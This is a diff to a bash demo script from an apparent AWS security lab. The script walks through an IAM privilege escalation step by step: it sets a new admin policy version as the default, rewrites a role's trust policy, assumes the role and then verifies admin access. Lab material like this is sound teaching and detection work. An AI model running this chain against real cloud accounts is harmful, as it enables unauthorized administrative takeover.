@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -66,6 +68,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -76,6 +87,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo "Target policy ARN: $TARGET_POLICY_ARN"
 echo "Target role name: $TARGET_ROLE_NAME"
@@ -84,17 +96,26 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -104,17 +125,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -122,8 +145,9 @@ else
 fi
 echo ""
 
-# Step 5: Verify we cannot assume the role yet
+# [EXPLOIT] Step 5: Verify we cannot assume the role yet
 echo -e "${YELLOW}Step 5: Verifying we cannot assume the role yet${NC}"
+use_starting_creds
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE_NAME"
 echo "Target role ARN: $TARGET_ROLE_ARN"
 echo "Attempting to assume role (should fail)..."
@@ -136,12 +160,14 @@ else
 fi
 echo ""
 
-# Step 6: Get current policy information
+# [OBSERVATION] Step 6: Get current policy information
 echo -e "${YELLOW}Step 6: Getting current policy information${NC}"
+use_readonly_creds
 echo "Target policy: $TARGET_POLICY_ARN"
 echo ""
 
 echo "Policy metadata:"
+show_cmd "ReadOnly" "aws iam get-policy --policy-arn $TARGET_POLICY_ARN --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' --output table"
 aws iam get-policy \
     --policy-arn $TARGET_POLICY_ARN \
     --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \
@@ -149,6 +175,7 @@ aws iam get-policy \
 
 echo ""
 echo "All policy versions:"
+show_cmd "ReadOnly" "aws iam list-policy-versions --policy-arn $TARGET_POLICY_ARN --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' --output table"
 aws iam list-policy-versions \
     --policy-arn $TARGET_POLICY_ARN \
     --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' \
@@ -156,8 +183,9 @@ aws iam list-policy-versions \
 
 echo -e "${GREEN}✓ Retrieved policy information${NC}\n"
 
-# Step 7: View current policy document
+# [OBSERVATION] Step 7: View current policy document
 echo -e "${YELLOW}Step 7: Viewing current policy document (v1)${NC}"
+use_readonly_creds
 echo "Current default version has minimal permissions:"
 echo ""
 
@@ -166,6 +194,7 @@ CURRENT_VERSION=$(aws iam get-policy \
     --query 'Policy.DefaultVersionId' \
     --output text)
 
+show_cmd "ReadOnly" "aws iam get-policy-version --policy-arn $TARGET_POLICY_ARN --version-id $CURRENT_VERSION --query 'PolicyVersion.Document' --output json"
 aws iam get-policy-version \
     --policy-arn $TARGET_POLICY_ARN \
     --version-id $CURRENT_VERSION \
@@ -174,10 +203,11 @@ aws iam get-policy-version \
 
 echo -e "${GREEN}✓ Current policy has no admin permissions${NC}\n"
 
-# Step 8: Create new policy version with admin permissions
+# [EXPLOIT] Step 8: Create new policy version with admin permissions
 echo -e "${YELLOW}Step 8: Creating new policy version with admin permissions${NC}"
 echo "This is the first privilege escalation action!"
 echo ""
+use_starting_creds
 
 # Create admin policy document
 ADMIN_POLICY_JSON='{
@@ -195,7 +225,7 @@ ADMIN_POLICY_JSON='{
 echo "$ADMIN_POLICY_JSON" > /tmp/admin-policy.json
 
 echo "Creating new policy version v2 with AdministratorAccess permissions..."
-show_attack_cmd "aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN --policy-document file:///tmp/admin-policy.json --set-as-default"
+show_attack_cmd "Attacker" "aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN --policy-document file:///tmp/admin-policy.json --set-as-default"
 aws iam create-policy-version \
     --policy-arn $TARGET_POLICY_ARN \
     --policy-document file:///tmp/admin-policy.json \
@@ -210,9 +240,11 @@ echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 9: Verify new policy version
+# [OBSERVATION] Step 9: Verify new policy version
 echo -e "${YELLOW}Step 9: Verifying new policy version${NC}"
+use_readonly_creds
 echo "Updated policy versions:"
+show_cmd "ReadOnly" "aws iam list-policy-versions --policy-arn $TARGET_POLICY_ARN --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' --output table"
 aws iam list-policy-versions \
     --policy-arn $TARGET_POLICY_ARN \
     --query 'Versions[*].[VersionId,IsDefaultVersion,CreateDate]' \
@@ -220,6 +252,7 @@ aws iam list-policy-versions \
 
 echo ""
 echo "New default version (v2) policy document:"
+show_cmd "ReadOnly" "aws iam get-policy-version --policy-arn $TARGET_POLICY_ARN --version-id v2 --query 'PolicyVersion.Document' --output json"
 aws iam get-policy-version \
     --policy-arn $TARGET_POLICY_ARN \
     --version-id v2 \
@@ -228,13 +261,14 @@ aws iam get-policy-version \
 
 echo -e "${GREEN}✓ Policy version v2 with admin permissions is now active${NC}\n"
 
-# Step 10: Update the role's trust policy to allow assumption by starting user
+# [EXPLOIT] Step 10: Update the role's trust policy to allow assumption by starting user
 echo -e "${YELLOW}Step 10: Updating role trust policy to allow assumption${NC}"
 echo "This is the second privilege escalation action!"
 echo ""
+use_starting_creds
 
 # Get the starting user ARN
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 STARTING_USER_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Starting user ARN: $STARTING_USER_ARN"
 
@@ -263,7 +297,7 @@ NEW_TRUST_POLICY='{
 echo "$NEW_TRUST_POLICY" > /tmp/new-trust-policy.json
 
 echo "Updating trust policy to allow: $STARTING_USER_ARN"
-show_attack_cmd "aws iam update-assume-role-policy --role-name $TARGET_ROLE_NAME --policy-document file:///tmp/new-trust-policy.json"
+show_attack_cmd "Attacker" "aws iam update-assume-role-policy --role-name $TARGET_ROLE_NAME --policy-document file:///tmp/new-trust-policy.json"
 aws iam update-assume-role-policy \
     --role-name $TARGET_ROLE_NAME \
     --policy-document file:///tmp/new-trust-policy.json
@@ -277,9 +311,11 @@ echo -e "${YELLOW}Waiting 15 seconds for trust policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Trust policy propagated${NC}\n"
 
-# Step 11: Verify updated trust policy
+# [OBSERVATION] Step 11: Verify updated trust policy
 echo -e "${YELLOW}Step 11: Verifying updated trust policy${NC}"
+use_readonly_creds
 echo "Updated trust policy:"
+show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json"
 aws iam get-role \
     --role-name $TARGET_ROLE_NAME \
     --query 'Role.AssumeRolePolicyDocument' \
@@ -287,11 +323,12 @@ aws iam get-role \
 
 echo -e "${GREEN}✓ Trust policy now allows assumption by starting user${NC}\n"
 
-# Step 12: Assume the target role
+# [EXPLOIT] Step 12: Assume the target role
 echo -e "${YELLOW}Step 12: Assuming the target role with admin permissions${NC}"
+use_starting_creds
 echo "Role ARN: $TARGET_ROLE_ARN"
 
-show_cmd "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
     --role-session-name demo-attack-session \
@@ -305,17 +342,17 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"
 
-# Step 13: Verify administrator access
+# [OBSERVATION] Step 13: Verify administrator access
 echo -e "${YELLOW}Step 13: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
